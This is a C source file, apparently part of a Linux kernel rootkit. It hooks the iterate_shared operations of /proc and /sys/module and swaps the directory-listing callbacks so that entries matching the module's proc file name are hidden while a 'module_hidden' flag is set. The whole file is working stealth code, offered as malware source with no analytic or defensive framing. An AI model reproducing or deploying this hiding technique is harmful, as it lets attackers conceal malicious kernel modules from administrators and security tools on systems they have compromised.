#include "hidefs.h"

extern u8 module_hidden;

// Vars for proc manipulation
int (*orig_proc_iterate_shared)(struct file *, struct dir_context *);
int (*orig_sys_iterate_shared)(struct file *, struct dir_context *);
int (*orig_filldir)(struct dir_context *, const char *, int, loff_t, u64,
                    unsigned);
int (*orig_sys_filldir)(struct dir_context *, const char *, int, loff_t, u64,
                        unsigned);

int rk_proc_filldir(struct dir_context *ctx, const char *proc_name, int len,
                    loff_t off, u64 ino, unsigned int d_type)
{
    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
        return 0;
    return orig_filldir(ctx, proc_name, len, off, ino, d_type);
}

int rk_sys_filldir(struct dir_context *ctx, const char *proc_name, int len,
                   loff_t off, u64 ino, unsigned int d_type)
{
    if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
        return 0;
    return orig_sys_filldir(ctx, proc_name, len, off, ino, d_type);
}

int rk_proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
    orig_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = rk_proc_filldir;
    return orig_proc_iterate_shared(file, ctx);
}

int rk_sys_iterate_shared(struct file *file, struct dir_context *ctx)
{
    orig_sys_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = rk_sys_filldir;
    return orig_sys_iterate_shared(file, ctx);
}

int hidefs_init(void)
{
    pr_info("Init hidefs");
    SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
    SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);

    return 0;
}

int hidefs_clean(void)
{
    UNSET_FOP(iterate_shared, "/proc", orig_proc_iterate_shared);
    UNSET_FOP(iterate_shared, "/sys/module", orig_sys_iterate_shared);

    return 0;
}